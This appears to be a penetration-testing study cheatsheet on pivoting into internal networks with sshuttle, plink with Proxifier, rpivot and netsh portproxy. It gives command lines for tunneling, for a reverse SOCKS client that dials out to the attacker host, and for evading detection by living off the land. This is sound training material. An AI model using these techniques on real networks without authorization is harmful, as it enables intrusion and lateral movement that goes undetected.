# Pivoting Tools — Sshuttle, Plink, Rpivot, Netsh Portproxy

## 1. Where These Fit

All four solve the same underlying problem as SSH `-L`/`-D`/`-R` (see the earlier pivoting cheatsheet) — reaching a network you have no direct route to — but each fits a different situation:

| Tool         | Runs where                          | Needs proxychains? | Best for                                               |
| ------------ | ------------------------------------ | ------------------- | -------------------------------------------------------|
| `sshuttle`   | Your attack host (Linux)             | **No**               | Linux pivot, SSH access, want to skip proxychains hassle |
| `plink.exe`  | Windows attack host                  | No (use Proxifier)   | You're attacking *from* Windows, or pivot only has PuTTY tools available |
| `rpivot`     | Attack host (server) + pivot (client)| Yes                   | No inbound SSH to the pivot at all — pivot must reach *out* to you |
| `netsh portproxy` | Compromised Windows host        | No                    | Windows pivot, no extra tools, "live off the land"     |

---

## 2. Sshuttle — SSH Pivoting Without Proxychains

`sshuttle` sets up the SOCKS/routing tunnel *and* transparently rewrites your local `iptables` rules, so any tool just works normally against the target subnet — no `proxychains` prefix needed at all.

**Limitation vs. SSH `-D`:** SSH tunneling only, no TOR/HTTPS proxy support. Linux attack host only (uses `iptables`).

### Install

```
sudo apt-get install sshuttle
```

### Route a subnet through the pivot

```
sudo sshuttle -r <PIVOT_USER>@<PIVOT_IP> <TARGET_SUBNET> -v
```

Example:

```
sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v
```

This connects over SSH, then adds `iptables` NAT rules redirecting traffic destined for `172.16.5.0/23` through the tunnel.

### Use any tool directly — no proxychains prefix

```
sudo nmap -v -A -sT -p3389 172.16.5.19 -Pn
```

Works exactly like scanning a normal reachable host. `xfreerdp`, `impacket-*`, browsers, everything — all work unmodified once sshuttle is running.

**Core takeaway:** sshuttle = SSH `-D` + proxychains, collapsed into one command with real routing instead of a SOCKS wrapper. If you have a Linux attack box and SSH creds to the pivot, prefer this over manually managing `-D` + `/etc/proxychains.conf`.

---

## 3. Plink — SSH Pivoting from a Windows Attack Host

`plink.exe` (PuTTY Link) is PuTTY's command-line SSH client. Same purpose as OpenSSH's `-D`, just for when your attack host — or the box you're living off — is Windows and doesn't have a native `ssh` client available.

### Start a dynamic (SOCKS) port forward

```
plink -ssh -D 9050 ubuntu@10.129.15.50
```

Same effect as `ssh -D 9050 ...` — plink starts listening locally on `9050` and tunnels SOCKS traffic over SSH to the pivot.

### Route Windows GUI tools through it — Proxifier

Windows has no `proxychains` equivalent for arbitrary GUI apps, so pair Plink with **Proxifier**: configure a SOCKS proxy profile pointing at `127.0.0.1:9050`, and any app you launch (e.g. `mstsc.exe` for RDP) gets tunneled through it transparently — no command-line wrapping needed.

**Use case worth remembering:** if you land on an old/locked-down Windows box that already has PuTTY installed (or you find a copy on a share), you can pivot using **tools already present** instead of dropping your own binaries and risking detection — classic living-off-the-land.

---

## 4. Rpivot — Reverse SOCKS Proxy (No Inbound Access to Pivot Needed)

Every technique above assumes you can **SSH in** to the pivot. `rpivot` flips that: it's for when you have code execution on an internal box but **no way to open an SSH/RDP session to it** — the internal box instead reaches *out* to your attack host and offers itself as a SOCKS relay.

```
Attack Host (server.py, listens)  ◀──outbound connection──  Internal/Pivot host (client.py)
```

**Note:** rpivot is Python 2 and effectively unmaintained — treat it as a fallback for the specific "pivot can't accept inbound connections at all" scenario, not a default choice.

### On your attack host — start the server

```
git clone https://github.com/klsecservices/rpivot.git
python2 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0
```

- `--server-port 9999` — the pivot connects back to you here.
- `--proxy-port 9050` — your local SOCKS proxy port (point proxychains at this).

### Transfer rpivot to the pivot/target and connect back

```
scp -r rpivot ubuntu@<PIVOT_IP>:/home/ubuntu/
python2 client.py --server-ip <ATTACK_HOST_IP> --server-port 9999
```

The pivot dials out to you on `9999`; once connected, your `server.py` exposes a SOCKS proxy on `9050` for the internal network behind that pivot.

### Use it with proxychains as normal

```
proxychains firefox-esr 172.16.5.135:80
```

### Behind an NTLM-authenticated HTTP proxy

If the only outbound path from the pivot is through a corporate HTTP proxy requiring NTLM auth, `client.py` can authenticate through it directly:

```
python client.py --server-ip <IP> --server-port 8080 --ntlm-proxy-ip <PROXY_IP> --ntlm-proxy-port <PROXY_PORT> --domain <DOMAIN> --username <USER> --password <PASS>
```

---

## 5. Netsh Portproxy — Windows-Native Port Forwarding

`netsh interface portproxy` forwards traffic hitting one port/IP on a Windows host to a different destination — a pure `-L`-style local forward, built into Windows with **zero extra tools needed**. Ideal when you've compromised a Windows box (e.g. an admin's workstation) and want to pivot without dropping anything onto disk.

### Add a forwarding rule

```cmd
netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25
```

Reads as: *"Anything hitting `10.129.15.150:8080` gets forwarded to `172.16.5.25:3389`."*

### Verify

```cmd
netsh.exe interface portproxy show v4tov4
```

### Connect from your attack host

Connect straight to the Windows pivot's forwarded port — it relays you to the real internal target:

```
xfreerdp /v:10.129.15.150:8080 /u:<USER> /p:'<PASSWORD>'
```

### Cleanup (don't leave rules behind)

```cmd
netsh.exe interface portproxy delete v4tov4 listenport=8080 listenaddress=10.129.15.150
```

**Core takeaway:** this is the Windows-native equivalent of `socat`/SSH `-L` — no PuTTY, no Python, nothing to transfer. Best default choice once you have a shell on a Windows pivot and just need a straightforward single-service forward.

---

## 6. Decision Cheat-Sheet

```
Have SSH creds + Linux attack host?          → sshuttle  (skip proxychains entirely)
Have SSH creds + Windows attack host?        → plink.exe + Proxifier
Pivot can't accept ANY inbound connection?   → rpivot  (reverse SOCKS, pivot dials out)
Already have a Windows shell, want a
  simple single-port forward, no extra tools?→ netsh interface portproxy
```

---

## 7. Core Things to Remember

- `sshuttle` gives you real routing (via `iptables`) instead of a SOCKS proxy — no `proxychains` prefix required on any tool.
- `plink.exe` is PuTTY's CLI SSH client — useful both from a Windows attacker box and as a living-off-the-land pivot tool on an already-compromised Windows machine.
- `rpivot` is the *only* one of these four built for a pivot that can only reach **out** to you, never accept inbound — remember it exists for that specific edge case, but don't reach for it by default (Python 2, unmaintained).
- `netsh interface portproxy` is Windows' built-in equivalent of SSH `-L` — no binaries to drop, and don't forget to `delete` the rule when you're done to avoid leaving forwarding rules on a client's machine.
- All of these ultimately do the same thing as the SSH `-L`/`-D`/`-R` techniques — they just fit different constraints (OS of your attack host, OS of the pivot, and which direction a connection can initiate).
